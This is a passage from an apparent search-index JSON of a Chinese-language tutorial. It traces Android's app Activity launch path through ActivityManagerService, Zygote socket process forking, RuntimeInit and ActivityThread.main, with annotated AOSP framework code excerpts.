ActivityStackSupervisor.resumeFocusedStackTopActivityLocked","text":"<p>frameworks/base/services/core/java/com/android/server/am/ActivityStackSupervisor.java\uff1a</p> <pre><code>boolean resumeFocusedStackTopActivityLocked(ActivityStack targetStack, ActivityRecord target,\n            ActivityOptions targetOptions) {\n    if (targetStack != null &amp;&amp; isFocusedStack(targetStack)) {\n        return targetStack.resumeTopActivityUncheckedLocked(target, targetOptions);\n    }\n    final ActivityRecord r = mFocusedStack.topRunningActivityLocked();\n    if (r == null || r.state != RESUMED) {\n        // \u8c03\u7528 ActivityStack \u7684 resumeTopActivityUncheckedLocked \u65b9\u6cd5\n        mFocusedStack.resumeTopActivityUncheckedLocked(null, null);\n    }\n    return false;\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#217-activitystackresumetopactivityuncheckedlocked","title":"2.1.7 ActivityStack.resumeTopActivityUncheckedLocked","text":"<p>\u67e5\u770b ActivityStack \u7684 resumeTopActivityUncheckedLocked \u65b9\u6cd5\uff1a</p> <pre><code>boolean resumeTopActivityUncheckedLocked(ActivityRecord prev, ActivityOptions options) {\n    ...\n    try {\n        ...\n        // \u8c03\u7528 resumeTopActivityInnerLocked \u65b9\u6cd5\n        result = resumeTopActivityInnerLocked(prev, options);\n    } finally {\n        mStackSupervisor.inResumeTopActivity = false;\n    }\n    return result;\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#218-activitystackresumetopactivityinnerlocked","title":"2.1.8 ActivityStack.resumeTopActivityInnerLocked","text":"<p>\u67e5\u770b resumeTopActivityInnerLocked \u65b9\u6cd5\uff1a</p> <pre><code>private boolean resumeTopActivityInnerLocked(ActivityRecord prev, ActivityOptions options) {\n    ...\n    final ActivityRecord next = topRunningActivityLocked();\n    ...\n    if (next.app != null &amp;&amp; next.app.thread != null) {\n        ...\n    } else {\n        ...\n        if (DEBUG_STATES) Slog.d(TAG_STATES, \"resumeTopActivityLocked: Restarting \" + next);\n        // \u8c03\u7528 ActivityStackSupervisor \u7684 startSpecificActivityLocked \u65b9\u6cd5\n        mStackSupervisor.startSpecificActivityLocked(next, true, true);\n    }\n\n    if (DEBUG_STACK) mStackSupervisor.validateTopActivitiesLocked();\n    return true;\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#219-activitystacksupervisorstartspecificactivitylocked","title":"2.1.9 ActivityStackSupervisor.startSpecificActivityLocked","text":"<p>\u56de\u5230 ActivityStackSupervisor \u7684 startSpecificActivityLocked \u65b9\u6cd5\uff1a</p> <pre><code>void startSpecificActivityLocked(ActivityRecord r, boolean andResume, boolean checkConfig) {\n    // \u5f53\u524d Activity \u9644\u5c5e\u7684 Application\n    ProcessRecord app = mService.getProcessRecordLocked(r.processName,\n            r.info.applicationInfo.uid, true);\n    r.task.stack.setLaunchTime(r);\n    // \u5982\u679c Application \u5df2\u7ecf\u8fd0\u884c\n    if (app != null &amp;&amp; app.thread != null) {\n        try {\n            if ((r.info.flags&amp;ActivityInfo.FLAG_MULTIPROCESS) == 0\n                    || !\"android\".equals(r.info.packageName)) {\n                app.addPackage(r.info.packageName, r.info.applicationInfo.versionCode,\n                        mService.mProcessStats);\n            }\n            realStartActivityLocked(r, app, andResume, checkConfig);\n            return;\n        } catch (RemoteException e) {\n            Slog.w(TAG, \"Exception when starting activity \"\n                    + r.intent.getComponent().flattenToShortString(), e);\n        }\n    }\n    // \u542f\u52a8\u65b0\u8fdb\u7a0b\n    mService.startProcessLocked(r.processName, r.info.applicationInfo, true, 0,\n            \"activity\", r.intent.getComponent(), false, false, true);\n}\n</code></pre> <p>\u9996\u5148\uff0c\u5728\u65b9\u6cd5\u4e2d\u83b7\u53d6\u4e86\u5f53\u524d Activity \u9644\u5c5e\u7684 Application\uff0c\u5982\u679c\u5df2\u7ecf\u5728\u8fd0\u884c\u4e86\uff0c\u8bf4\u660e\u8fd9\u4e2a App \u662f\u5df2\u7ecf\u88ab\u542f\u52a8\u8fc7\u4e86\u7684\uff0c\u8fd9\u65f6\u5019\u8c03\u7528 realStartActivityLocked \u65b9\u6cd5\u5c31\u53ef\u4ee5\u8fdb\u5165\u4e0b\u4e00\u6b65\u7684\u6d41\u7a0b\u4e86\uff0c\u540c\u4e00\u4e2a App \u4e2d\u4e0d\u540c Activity \u7684\u76f8\u4e92\u542f\u52a8\u5c31\u662f\u8d70\u7684\u8fd9\u4e2a\u6d41\u7a0b\u3002\u5f53 Application \u6ca1\u6709\u8fd0\u884c\u7684\u65f6\u5019\uff0c\u5c31\u9700\u8981\u8c03\u7528 AMS \u7684 startProcessLocked \u65b9\u6cd5\u542f\u52a8\u4e00\u4e2a\u8fdb\u7a0b\u53bb\u627f\u8f7d\u5b83\u7136\u540e\u5b8c\u6210\u540e\u7eed\u7684\u5de5\u4f5c\uff0c\u987a\u4fbf\u94fa\u57ab\u4e00\u4e0b\uff0c\u5f53\u65b0\u8fdb\u7a0b\u88ab\u542f\u52a8\u5b8c\u6210\u540e\u8fd8\u4f1a\u8c03\u7528\u56de\u5230\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u67e5\u770b AMS \u7684 startProcessLocked \u65b9\u6cd5\uff1a</p>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#2110-activitymanagerservicestartprocesslocked","title":"2.1.10 ActivityManagerService.startProcessLocked","text":"<pre><code>final ProcessRecord startProcessLocked(String processName,\n        ApplicationInfo info, boolean knownToBeDead, int intentFlags,\n        String hostingType, ComponentName hostingName, boolean allowWhileBooting,\n        boolean isolated, boolean keepIfLarge) {\n    return startProcessLocked(processName, info, knownToBeDead, intentFlags, hostingType,\n            hostingName, allowWhileBooting, isolated, 0 /* isolatedUid */, keepIfLarge,\n            null /* ABI override */, null /* entryPoint */, null /* entryPointArgs */,\n            null /* crashHandler */);\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#2111-activitymanagerservicestartprocesslocked","title":"2.1.11 ActivityManagerService.startProcessLocked","text":"<p>\u8c03\u7528 startProcessLocked \u65b9\u6cd5\uff1a</p> <pre><code>final ProcessRecord startProcessLocked(String processName, ApplicationInfo info,\n        boolean knownToBeDead, int intentFlags, String hostingType, ComponentName hostingName,\n        boolean allowWhileBooting, boolean isolated, int isolatedUid, boolean keepIfLarge,\n        String abiOverride, String entryPoint, String[] entryPointArgs, Runnable crashHandler){\n    ...\n    startProcessLocked(app, hostingType, hostingNameStr, abiOverride, entryPoint, entryPointArgs);\n    checkTime(startTime, \"startProcess: done starting proc!\");\n    return (app.pid != 0) ? app : null;\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#2112-activitymanagerservicestartprocesslocked","title":"2.1.12 ActivityManagerService.startProcessLocked","text":"<p>\u8c03\u7528 startProcessLocked \u7684\u91cd\u8f7d\u65b9\u6cd5\uff1a</p> <pre><code>private final void startProcessLocked(ProcessRecord app, String hostingType,\n        String hostingNameStr, String abiOverride, String entryPoint, String[] entryPointArgs){\n    ...\n    try {\n        ...\n        // \u8c03\u7528 Process \u7684 start \u65b9\u6cd5\n        Process.ProcessStartResult startResult = Process.start(entryPoint,\n                app.processName, uid, uid, gids, debugFlags, mountExternal,\n                app.info.targetSdkVersion, app.info.seinfo, requiredAbi, instructionSet,\n                app.info.dataDir, entryPointArgs);\n        ...\n    } catch (RuntimeException e) {\n        ...\n    }\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#2113-processstart","title":"2.1.13 Process.start","text":"<p>frameworks/base/services/core/java/android/os/Process.java\uff1a</p> <pre><code>public static final ProcessStartResult start(final String processClass,\n                                final String niceName,\n                                int uid, int gid, int[] gids,\n                                int debugFlags, int mountExternal,\n                                int targetSdkVersion,\n                                String seInfo,\n                                String abi,\n                                String instructionSet,\n                                String appDataDir,\n                                String[] zygoteArgs) {\n    try {\n        // \u8c03\u7528 startViaZygote \u65b9\u6cd5\n        return startViaZygote(processClass, niceName, uid, gid, gids,\n                debugFlags, mountExternal, targetSdkVersion, seInfo,\n                abi, instructionSet, appDataDir, zygoteArgs);\n    } catch (ZygoteStartFailedEx ex) {\n        Log.e(LOG_TAG,\n                \"Starting VM process through Zygote failed\");\n        throw new RuntimeException(\n                \"Starting VM process through Zygote failed\", ex);\n    }\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#2114-processstartviazygote","title":"2.1.14 Process.startViaZygote","text":"<p>\u67e5\u770b startViaZygote \u65b9\u6cd5\uff1a</p> <pre><code>private static ProcessStartResult startViaZygote(final String processClass,\n                                final String niceName,\n                                final int uid, final int gid,\n                                final int[] gids,\n                                int debugFlags, int mountExternal,\n                                int targetSdkVersion,\n                                String seInfo,\n                                String abi,\n                                String instructionSet,\n                                String appDataDir,\n                                String[] extraArgs)\n                                throws ZygoteStartFailedEx {\n    synchronized(Process.class) {\n        ...\n        // \u8c03\u7528 zygoteSendArgsAndGetResult \u65b9\u6cd5\uff0c\u4f20\u5165 openZygoteSocketIfNeeded \u7684\u8fd4\u56de\u503c\n        return zygoteSendArgsAndGetResult(openZygoteSocketIfNeeded(abi), argsForZygote);\n    }\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#2115-processzygotesendargsandgetresultprocessopenzygotesocketifneeded","title":"2.1.15 Process.zygoteSendArgsAndGetResult\u3001Process.openZygoteSocketIfNeeded","text":"<p>\u67e5\u770b zygoteSendArgsAndGetResult \u65b9\u6cd5\uff1a</p> <pre><code>private static ProcessStartResult zygoteSendArgsAndGetResult(\n            ZygoteState zygoteState, ArrayList&lt;String&gt; args)\n            throws ZygoteStartFailedEx {\n    try {\n        ...\n        final BufferedWriter writer = zygoteState.writer;\n        final DataInputStream inputStream = zygoteState.inputStream;\n\n        writer.write(Integer.toString(args.size()));\n        writer.newLine();\n\n        for (int i = 0; i &lt; sz; i++) {\n            String arg = args.get(i);\n            writer.write(arg);\n            writer.newLine();\n        }\n\n        writer.flush();\n\n        // Should there be a timeout on this?\n        ProcessStartResult result = new ProcessStartResult();\n\n        // \u7b49\u5f85 socket \u670d\u52a1\u7aef\uff08\u5373zygote\uff09\u8fd4\u56de\u65b0\u521b\u5efa\u7684\u8fdb\u7a0bpid;\n        result.pid = inputStream.readInt();\n        result.usingWrapper = inputStream.readBoolean();\n\n        if (result.pid &lt; 0) {\n            throw new ZygoteStartFailedEx(\"fork() failed\");\n        }\n        return result;\n    } catch (IOException ex) {\n        zygoteState.close();\n        throw new ZygoteStartFailedEx(ex);\n    }\n}\n</code></pre> <p>\u5728 zygoteSendArgsAndGetResult \u4e2d\u7b49\u5f85 Socket \u670d\u52a1\u7aef\uff0c\u4e5f\u5c31\u662f zygote \u8fdb\u7a0b\u8fd4\u56de\u521b\u5efa\u65b0\u8fdb\u7a0b\u7684\u7ed3\u679c\uff0c\u8fd9\u91cc zygoteState \u53c2\u6570\u662f\u7531 openZygoteSocketIfNeeded \u65b9\u6cd5\u8fd4\u56de\u7684\uff0copenZygoteSocketIfNeeded \u65b9\u6cd5\u5219\u8d1f\u8d23\u6839\u636e abi \u5411 Zygote \u8fdb\u7a0b\u53d1\u8d77\u8fde\u63a5\u8bf7\u6c42\uff1a</p> <pre><code>private static ZygoteState openZygoteSocketIfNeeded(String abi) throws ZygoteStartFailedEx {\n    if (primaryZygoteState == null || primaryZygoteState.isClosed()) {\n        try {\n            // \u5411\u4e3bzygote\u53d1\u8d77connect()\u64cd\u4f5c\n            primaryZygoteState = ZygoteState.connect(ZYGOTE_SOCKET);\n        } catch (IOException ioe) {\n            throw new ZygoteStartFailedEx(\"Error connecting to primary zygote\", ioe);\n        }\n    }\n\n    if (primaryZygoteState.matches(abi)) {\n        return primaryZygoteState;\n    }\n\n    if (secondaryZygoteState == null || secondaryZygoteState.isClosed()) {\n        try {\n            // \u5f53\u4e3bzygote\u6ca1\u80fd\u5339\u914d\u6210\u529f\uff0c\u5219\u91c7\u7528\u7b2c\u4e8c\u4e2azygote\uff0c\u53d1\u8d77connect()\u64cd\u4f5c\n            secondaryZygoteState = ZygoteState.connect(SECONDARY_ZYGOTE_SOCKET);\n        } catch (IOException ioe) {\n            throw new ZygoteStartFailedEx(\"Error connecting to secondary zygote\", ioe);\n        }\n    }\n\n    if (secondaryZygoteState.matches(abi)) {\n        return secondaryZygoteState;\n    }\n\n    throw new ZygoteStartFailedEx(\"Unsupported zygote ABI: \" + abi);\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#22","title":"2.2 \u5c0f\u7ed3","text":"<p>\u5982\u679c\u662f\u4ece\u684c\u9762\u65b0\u542f\u52a8\u4e00\u4e2a App \u4e2d\u7684 Activity\uff0c\u6b64\u65f6\u662f\u6ca1\u6709\u8fdb\u7a0b\u53bb\u627f\u8f7d\u8fd9\u4e2a App \u7684\uff0c\u56e0\u6b64\u9700\u8981\u901a\u8fc7 AMS \u5411 zygote \u7ee7\u627f\u53d1\u8d77\u8bf7\u6c42\u53bb\u5b8c\u6210\u8fd9\u4e2a\u4efb\u52a1\uff0cAMS \u8fd0\u884c\u5728 system_server \u8fdb\u7a0b\u4e2d\uff0c\u5b83\u901a\u8fc7 Socket \u5411 zygote \u53d1\u8d77 fock \u8fdb\u7a0b\u7684\u8bf7\u6c42\uff0c\u4ece AMS \u5f00\u59cb\u7684\u8c03\u7528\u65f6\u5e8f\u56fe\u5982\u4e0b\uff1a</p> <p></p>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#3-zygote-activitythread","title":"3. zygote \u2014\u2014 ActivityThread","text":""},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#31","title":"3.1 \u8c03\u7528\u8fc7\u7a0b\u5206\u6790","text":""},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#311-zygoteinitmain","title":"3.1.1 ZygoteInit.main","text":"<p>\u5728 Android \u7cfb\u7edf\u542f\u52a8\u6d41\u7a0b\u5206\u6790 \u6587\u4e2d\u63d0\u5230\u8fc7 zygote \u8fdb\u7a0b\u7684\u5176\u4e2d\u4e00\u9879\u4efb\u52a1\u5c31\u662f\uff1a</p> <p>\u8c03\u7528 registerZygoteSocket() \u51fd\u6570\u5efa\u7acb Socket \u901a\u9053\uff0c\u4f7f zygote \u8fdb\u7a0b\u6210\u4e3a Socket \u670d\u52a1\u7aef\uff0c\u5e76\u901a\u8fc7 runSelectLoop() \u51fd\u6570\u7b49\u5f85 ActivityManagerService \u53d1\u9001\u8bf7\u6c42\u521b\u5efa\u65b0\u7684\u5e94\u7528\u7a0b\u5e8f\u8fdb\u7a0b\u3002  </p> <p>zygote \u7ec8\u4e8e\u8981\u518d\u6b21\u4e0a\u573a\u4e86\uff01\u63a5\u4e0b\u6765\u4ece ZygoteInit.java \u7684 main \u65b9\u6cd5\u5f00\u59cb\u56de\u987e\u4e00\u4e0b zygote \u8fdb\u7a0b\u7684\u5de5\u4f5c\uff1a</p> <p>frameworks/base/core/java/com/android/internal/os/ZygoteInit.java\uff1a</p> <pre><code>public static void main(String argv[]) {\n    try {\n        ...\n        runSelectLoop(abiList);\n        ....\n    } catch (MethodAndArgsCaller caller) {\n        caller.run();\n    } catch (RuntimeException ex) {\n        closeServerSocket();\n        throw ex;\n    }\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#312-zygoteinitrunselectloop","title":"3.1.2 ZygoteInit.runSelectLoop","text":"<p>\u67e5\u770b runSelectLoop \u65b9\u6cd5\uff1a</p> <pre><code>private static void runSelectLoop(String abiList) throws MethodAndArgsCaller {\n    ...\n    // \u5faa\u73af\u8bfb\u53d6\u72b6\u6001\n    while (true) {\n        ...\n        for (int i = pollFds.length - 1; i &gt;= 0; --i) {\n            // \u8bfb\u53d6\u7684\u72b6\u6001\u4e0d\u662f\u5ba2\u6237\u7aef\u8fde\u63a5\u6216\u8005\u6570\u636e\u8bf7\u6c42\u65f6\uff0c\u8fdb\u5165\u4e0b\u4e00\u6b21\u5faa\u73af\n            if ((pollFds[i].revents &amp; POLLIN) == 0) {\n                continue;\n            }\n            if (i == 0) {// i = 0 \u8868\u793a\u8ddf\u5ba2\u6237\u7aef Socket \u8fde\u63a5\u4e0a\u4e86\n                ZygoteConnection newPeer = acceptCommandPeer(abiList);\n                peers.add(newPeer);\n                fds.add(newPeer.getFileDesciptor());\n            } else {// i &gt; 0 \u8868\u793a\u63a5\u6536\u5230\u5ba2\u6237\u7aef Socket \u53d1\u9001\u8fc7\u6765\u7684\u8bf7\u6c42\n                // runOnce \u65b9\u6cd5\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5e94\u7528\u7a0b\u5e8f\u8fdb\u7a0b\n                boolean done = peers.get(i).runOnce();\n                if (done) {\n                    peers.remove(i);\n                    fds.remove(i);\n                }\n            }\n        }\n    }\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#313-zygoteconnectionrunonce","title":"3.1.3 ZygoteConnection.runOnce","text":"<p>\u67e5\u770b frameworks/base/core/java/com/android/internal/os/ZygoteConnection.java \u7684 runOnce \u65b9\u6cd5\uff1a</p> <pre><code>boolean runOnce() throws ZygoteInit.MethodAndArgsCaller {\n    String args[];\n    Arguments parsedArgs = null;\n    FileDescriptor[] descriptors;\n\n    try {\n        // \u8bfb\u53d6 socket \u5ba2\u6237\u7aef\u53d1\u9001\u8fc7\u6765\u7684\u53c2\u6570\u5217\u8868\n        args = readArgumentList();\n        descriptors = mSocket.getAncillaryFileDescriptors();\n    } catch (IOException ex) {\n        // EOF reached.\n        closeSocket();\n        return true;\n    }\n    ...\n    try {\n        // \u5c06 socket \u5ba2\u6237\u7aef\u4f20\u9012\u8fc7\u6765\u7684\u53c2\u6570\uff0c\u89e3\u6790\u6210 Arguments \u5bf9\u8c61\u683c\u5f0f\n        parsedArgs = new Arguments(args);\n        ...\n        // \u540c\u6837\u8c03\u7528 Zygote.java \u7684 forkAndSpecialize \u65b9\u6cd5 fock \u51fa\u5b50\u8fdb\u7a0b\n        pid = Zygote.forkAndSpecialize(parsedArgs.uid, parsedArgs.gid, parsedArgs.gids,\n                parsedArgs.debugFlags, rlimits, parsedArgs.mountExternal, parsedArgs.seInfo,\n                parsedArgs.niceName, fdsToClose, parsedArgs.instructionSet,\n                parsedArgs.appDataDir);\n    } catch (Exception e) {\n        ...\n    }\n\n    try {\n        if (pid == 0) {\n            // \u5b50\u8fdb\u7a0b\u6267\u884c\n            IoUtils.closeQuietly(serverPipeFd);\n            serverPipeFd = null;\n            // \u8fdb\u5165\u5b50\u8fdb\u7a0b\u6d41\u7a0b\n            handleChildProc(parsedArgs, descriptors, childPipeFd, newStderr);\n            return true;\n        } else {\n            // \u7236\u8fdb\u7a0b\u6267\u884c\n            IoUtils.closeQuietly(childPipeFd);\n            childPipeFd = null;\n            return handleParentProc(pid, descriptors, serverPipeFd, parsedArgs);\n        }\n    } finally {\n        IoUtils.closeQuietly(childPipeFd);\n        IoUtils.closeQuietly(serverPipeFd);\n    }\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#314-zygoteconnectionhandlechildproc","title":"3.1.4 ZygoteConnection.handleChildProc","text":"<p>\u9996\u5148\u89e3\u6790 Socket \u5ba2\u6237\u7aef\u4f20\u8fc7\u6765\u7684\u53c2\u6570\uff0cZygote.java \u7684 forkAndSpecialize \u8fd4\u56de\u7684 pid == 0 \u7684\u65f6\u5019\u8868\u793a\u6b64\u65f6\u5728 fock \u51fa\u6765\u7684\u5b50\u8fdb\u7a0b\u4e2d\u6267\u884c\uff0c\u7ee7\u7eed\u8c03\u7528 handleChildProc \u65b9\u6cd5\uff0c\u5e76\u5c06\u53c2\u6570\u7ee7\u7eed\u5c42\u5c42\u4f20\u9012\uff1a</p> <pre><code>private void handleChildProc(Arguments parsedArgs, FileDescriptor[] \n    descriptors, FileDescriptor pipeFd, PrintStream newStderr) throws ZygoteInit.MethodAndArgsCaller {\n    /*\u7531\u4e8e fock \u51fa\u6765\u7684 system_server \u8fdb\u7a0b\u4f1a\u590d\u5236 zygote \u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\uff0c\u56e0\u6b64\u5b83\u4e5f\u5f97\u5230\u4e86 zygote\n    \u8fdb\u7a0b\u4e2d\u7684 Socket\uff0c\u8fd9\u4e2a Socket \u5bf9\u5b83\u6765\u8bf4\u5e76\u65e0\u7528\u5904\uff0c\u8fd9\u91cc\u5c06\u5176\u5173\u95ed \n    */\n    closeSocket();\n    ZygoteInit.closeServerSocket();\n    ...\n    if (parsedArgs.niceName != null) {\n        // \u8bbe\u7f6e\u8fdb\u7a0b\u540d\n        Process.setArgV0(parsedArgs.niceName);\n    }\n\n    if (parsedArgs.invokeWith != null) {\n        ...\n    } else {\n        // \u8c03\u7528 RuntimeInit \u7684 zygoteInit \u65b9\u6cd5\n        RuntimeInit.zygoteInit(parsedArgs.targetSdkVersion,\n                parsedArgs.remainingArgs, null);\n    }\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#315-runtimeinitzygoteinit","title":"3.1.5 RuntimeInit.zygoteInit","text":"<p>\u67e5\u770b frameworks/base/core/java/com/android/internal/os/RuntimeInit.java \u7684 zygoteInit \u65b9\u6cd5\uff1a</p> <pre><code>public static final void zygoteInit(int targetSdkVersion, String[] argv, \n            ClassLoader classLoader) throws ZygoteInit.MethodAndArgsCaller {\n    if (DEBUG) Slog.d(TAG, \"RuntimeInit: Starting application from zygote\");\n\n    Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, \"RuntimeInit\");\n    // \u91cd\u5b9a\u5411 log \u8f93\u51fa\n    redirectLogStreams();\n    // \u521d\u59cb\u5316\u4e00\u4e9b\u901a\u7528\u7684\u8bbe\u7f6e\n    commonInit(); \n    /**\n     *\u901a\u8fc7 Native \u5c42\u4e2d AndroidRuntime.cpp \u7684 JNI \u65b9\u6cd5\u6700\u7ec8\u8c03\u7528 app_main.cpp \u7684 \n     *onZygoteInit \u65b9\u6cd5\u542f\u52a8 Binder \u7ebf\u7a0b\u6c60\uff0c \u4f7f system_server \u8fdb\u7a0b\u53ef\u4ee5\u4f7f\u7528 Binder  *\u4e0e\u5176\u4ed6\u8fdb\u7a0b\u901a\u4fe1\n     **/\n    nativeZygoteInit(); \n    applicationInit(targetSdkVersion, argv, classLoader);\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#316-runtimeinitapplicationinit","title":"3.1.6 RuntimeInit.applicationInit","text":"<p>\u7ee7\u7eed\u8c03\u7528 applicationInit \u65b9\u6cd5\uff1a</p> <pre><code>private static void applicationInit(int targetSdkVersion, String[] argv, ClassLoader classLoader)\n            throws ZygoteInit.MethodAndArgsCaller {\n    ...\n    // \u63d0\u53d6\u51fa\u53c2\u6570\u91cc\u9762\u7684\u8981\u542f\u52a8\u7684\u7c7b\u7684\u540d\u5b57\n    invokeStaticMain(args.startClass, args.startArgs, classLoader);\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#317-runtimeinitinvokestaticmain","title":"3.1.7 RuntimeInit.invokeStaticMain","text":"<p>\u4e3b\u8981\u8c03\u7528\u4e86 invokeStaticMain \u65b9\u6cd5\uff1a</p> <pre><code>private static void invokeStaticMain(String className, String[] argv, ClassLoader classLoader)\n         throws ZygoteInit.MethodAndArgsCaller {\n    Class&lt;?&gt; cl;\n    try {\n        /** className \u4e3a\u901a\u8fc7 Socket \u5ba2\u6237\u7aef\uff08AMS\uff09\u4f20\u9012\u8fc7\u6765\u7684\u4e00\u7cfb\u5217\u53c2\u6570\u4e2d\u7684\u5176\u4e2d\u4e00\u4e2a\uff0c\u8fd9\u91cc\u83b7\u53d6\u5230\u7684\u503c\u4e3a\u4f20\"com.android.app.ActivityThread\"\uff0c\u7136\u540e\u901a\u8fc7\u53cd\u5c04\u5f97\u5230 ActivityThread \u7c7b **/\n        cl = Class.forName(className, true, classLoader);\n    } catch (ClassNotFoundException ex) {\n        throw new RuntimeException(\n            \"Missing class when invoking static main \" + className, ex);\n    }\n    Method m;\n    try {\n        // \u627e\u5230 ActivityThread \u7c7b\u7684 main \u65b9\u6cd5\n        m = cl.getMethod(\"main\", new Class[] { String[].class });\n    } catch (NoSuchMethodException ex) {\n        throw new RuntimeException(\n            \"Missing static main on \" + className, ex);\n    } catch (SecurityException ex) {\n        throw new RuntimeException(\n            \"Problem getting static main on \" + className, ex);\n    }\n    int modifiers = m.getModifiers();\n    if (! (Modifier.isStatic(modifiers) &amp;&amp; Modifier.isPublic(modifiers))) {\n        throw new RuntimeException(\n            \"Main method is not public and static on \" + className);\n    }\n    /** \u5c06 main \u65b9\u6cd5\u5305\u88c5\u5728 ZygoteInit.MethodAndArgsCaller \u7c7b\u4e2d\u5e76\u4f5c\u4e3a\u5f02\u5e38\u629b\u51fa\n    \u6355\u83b7\u5f02\u5e38\u7684\u5730\u65b9\u5728\u4e0a\u4e00\u5c0f\u8282\u4e2d ZygoteInit.java \u7684 main \u65b9\u6cd5 **/\n    throw new ZygoteInit.MethodAndArgsCaller(m, argv);\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#318-methodandargscallerrun","title":"3.1.8 MethodAndArgsCaller.run","text":"<p>\u56de\u5230 ZygoteInit \u7684 main \u65b9\u6cd5\uff1a</p> <pre><code>public static void main(String argv[]) {\n    ...\n    closeServerSocket();\n    } catch (MethodAndArgsCaller caller) {\n        // \u63a5\u6536\u5230 caller \u5bf9\u8c61\u540e\u8c03\u7528\u5b83\u7684 run \u65b9\u6cd5\n        caller.run();\n    } catch (RuntimeException ex) {\n        Log.e(TAG, \"Zygote died with exception\", ex);\n        closeServerSocket();\n        throw ex;\n    }\n}\n</code></pre> <p>\u8ddf system_server \u8fdb\u7a0b\u7684\u542f\u52a8\u8fc7\u7a0b\u4e00\u6837\uff0c\u8fd9\u91cc\u540c\u6837\u901a\u8fc7\u629b\u51fa\u5f02\u5e38\u7684\u65b9\u5f0f\u6765\u6e05\u7a7a\u8c03\u7528 ActivityThread.main \u4e4b\u524d\u7684\u65b9\u6cd5\u6808\u5e27\u3002</p> <p>ZygoteInit \u7684 MethodAndArgsCaller \u7c7b\u662f\u4e00\u4e2a Exception \u7c7b\uff0c\u540c\u65f6\u4e5f\u5b9e\u73b0\u4e86 Runnable \u63a5\u53e3\uff1a</p> <pre><code>public static class MethodAndArgsCaller extends Exception\n        implements Runnable {\n\n    private final Method mMethod;\n    private final String[] mArgs;\n\n    public MethodAndArgsCaller(Method method, String[] args) {\n        mMethod = method;\n        mArgs = args;\n    }\n    public void run() {\n        try {\n            // \u8c03\u7528\u4f20\u9012\u8fc7\u6765\u7684 mMethod\n            mMethod.invoke(null, new Object[] { mArgs });\n        } catch (IllegalAccessException ex) {\n            throw new RuntimeException(ex);\n        } catch (InvocationTargetException ex) {\n            ...\n        }\n    }\n}\n</code></pre>"},{"location":"Android/Android%20AppActivity%20%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#319-activitythread-main","title":"3.1.9 ActivityThread .main","text":"<p>\u6700\u540e\u901a\u8fc7\u53cd\u5c04\u8c03\u7528\u5230 ActivityThread \u7684 main \u65b9\u6cd5\uff1a</p> <pre><code>public static void main(String[] args) {\n    ...\n    Environment.initForCurrentUser();\n    ...\n    Process.setArgV0(\"&lt;pre-initialized&gt;\");\n    // \u521b\u5efa\u4e3b\u7ebf\u7a0b Looper\n    Looper.prepareMainLooper();\n\n    ActivityThread thread = new ActivityThread();\n    // attach \u5230\u7cfb\u7edf\u8fdb\u7a0b\n    thread.attach(false);\n\n    if (sMainThreadHandler == null) {\n        sMainThreadHandler = thread.getHandler();\n    }\n\n    // \u4e3b\u7ebf\u7a0b\u8fdb\u5165\u8f6e\u8be2\u72b6\u6001\n    Looper.loop();\n\n    // \u629b\u51fa\u5f02\u5e38\u8bf4\u660e\u8f6e\u8be2\u51fa\u73b0\u95ee\u9898\n    throw new RuntimeException(\"Main thread loop unexpectedly 